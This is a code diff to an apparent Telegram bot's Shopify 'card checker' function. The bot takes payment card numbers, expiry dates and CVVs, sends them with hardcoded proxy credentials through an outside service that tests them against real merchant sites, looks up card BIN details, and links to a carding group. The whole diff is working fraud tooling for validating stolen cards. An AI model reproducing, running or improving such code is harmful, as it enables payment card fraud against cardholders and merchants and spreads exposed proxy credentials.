@@ -2087,6 +2087,7 @@ async def consume_credit(user_id: int) -> bool:
 
 
 # --- Shopify Processor ---
+
 async def process_sh(update: Update, context: ContextTypes.DEFAULT_TYPE, payload: str):
     try:
         user = update.effective_user
@@ -2107,23 +2108,43 @@ async def process_sh(update: Update, context: ContextTypes.DEFAULT_TYPE, payload
 
         cc, mm, yy, cvv = [p.strip() for p in parts]
         full_card = f"{cc}|{mm}|{yy}|{cvv}"
+        cc_normalized = cc.strip()
 
-        # --- API URL (fixed f-string) ---
-        api_url = (
-            f"https://auto-shopify-6cz4.onrender.com/index.php"
-            f"?site=https://tackletech3d.com"
-            f"&cc={cc}|{mm}|{yy}|{cvv}"
-            f"&proxy=107.172.163.27:6543:nslqdeey:jhmrvnto65s1"
+        # --- Clickable bullet ---
+        BULLET_GROUP_LINK = "https://t.me/CARDER33"
+        bullet_link = f"[⌇]({BULLET_GROUP_LINK})"
+
+        # --- Gateway & status for initial message ---
+        gateway_text = escape_markdown("Gateway ➜ #Shopify", version=2)
+        status_text = escape_markdown("Status ➜ Checking 🔎...", version=2)
+
+        # --- Send initial processing message ---
+        processing_text = (
+            "```𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴⏳```" + "\n"
+            f"```{cc_normalized}```" + "\n\n"
+            f"{bullet_link} {gateway_text}\n"
+            f"{bullet_link} {status_text}\n"
+        )
+        processing_msg = await update.message.reply_text(
+            processing_text,
+            parse_mode=ParseMode.MARKDOWN_V2,
+            disable_web_page_preview=True
         )
 
-        processing_msg = await update.message.reply_text("⏳ 𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴 𝘆𝗼𝘂𝗿 𝗿𝗲𝗾𝘂𝗲𝘀𝘁…")
+        # --- API URL ---
+        api_url = (
+            f"https://auto-shopify-6cz4.onrender.com/index.php"
+            f"?site=https://craneandcanopy.com"
+            f"&cc={full_card}"
+            f"&proxy=107.172.163.27:6543:nslqdeey:jhmrvnto65s1"
+        )
 
         # --- Make API request ---
         async with aiohttp.ClientSession() as session:
             async with session.get(api_url, headers={"User-Agent": "Mozilla/5.0"}, timeout=50) as resp:
                 api_response = await resp.text()
 
-        # --- Parse API response safely ---
+        # --- Parse API response ---
         try:
             data = json.loads(api_response)
         except json.JSONDecodeError:
@@ -2134,38 +2155,27 @@ async def process_sh(update: Update, context: ContextTypes.DEFAULT_TYPE, payload
             )
             return
 
-        # --- Extract fields from API ---
         response = data.get("Response", "Unknown")
         status = data.get("Status", "Unknown")
         price = data.get("Price", "N/A")
         gateway = data.get("Gateway", "Shopify")
 
-        # --- BIN lookup (your exact logic, unchanged) ---
+        # --- BIN lookup ---
         try:
             bin_number = cc[:6]
             bin_details = await get_bin_info(bin_number)
-
             brand = (bin_details.get("scheme") or "N/A").title()
             issuer = bin_details.get("bank") or "N/A"
             country_name = bin_details.get("country") or "Unknown"
             country_flag = bin_details.get("country_emoji", "")
-            card_type = bin_details.get("type", "N/A")
-            card_level = bin_details.get("brand", "N/A")
-            card_length = bin_details.get("length", "N/A")
-            luhn_check = bin_details.get("luhn", "N/A")
-            bank_phone = bin_details.get("bank_phone", "N/A")
-            bank_url = bin_details.get("bank_url", "N/A")
         except Exception as e:
             logger.warning(f"BIN lookup failed for {bin_number}: {e}")
-            brand = issuer = card_type = card_level = card_length = luhn_check = bank_phone = bank_url = "N/A"
+            brand = issuer = "N/A"
             country_name = "Unknown"
             country_flag = ""
 
-        # --- Fetch updated user credits ---
-        updated_user = await get_user(user.id)
-        credits_left = updated_user.get("credits", 0)
-
         # --- User info ---
+        updated_user = await get_user(user.id)
         requester = f"@{user.username}" if user.username else str(user.id)
 
         # --- Developer info ---
@@ -2173,15 +2183,11 @@ async def process_sh(update: Update, context: ContextTypes.DEFAULT_TYPE, payload
         DEVELOPER_LINK = "https://t.me/Kalinuxxx"
         developer_clickable = f"<a href='{DEVELOPER_LINK}'>{DEVELOPER_NAME}</a>"
 
-        # --- Bullet + group link ---
-        BULLET_GROUP_LINK = "https://t.me/CARDER33"
-        bullet_link = f'<a href="{BULLET_GROUP_LINK}">[⌇]</a>'
-
         # --- Final formatted message ---
         formatted_msg = (
             f"═══[ <b>SHOPIFY</b> ]═══\n"
             f"{bullet_link} <b>Card</b> ➜ <code>{escape(full_card)}</code>\n"
-            f"{bullet_link} <b>Gateway</b> ➜ 𝙎𝙝𝙤𝙥𝙞𝙛𝙮 𝟭𝟭$\n"
+            f"{bullet_link} <b>Gateway</b> ➜ {escape(gateway)}\n"
             f"{bullet_link} <b>Response</b> ➜ <i>{escape(response)}</i>\n"
             f"{bullet_link} <b>Price</b> ➜ {escape(price)} 💸\n"
             f"――――――――――――――――\n"
@@ -2194,6 +2200,7 @@ async def process_sh(update: Update, context: ContextTypes.DEFAULT_TYPE, payload
             f"――――――――――――――――"
         )
 
+        # --- Edit the processing message with final output ---
         await processing_msg.edit_text(
             formatted_msg,
             parse_mode=ParseMode.HTML,
@@ -2209,6 +2216,7 @@ async def process_sh(update: Update, context: ContextTypes.DEFAULT_TYPE, payload
             )
         except Exception:
             pass
+
 
 
 
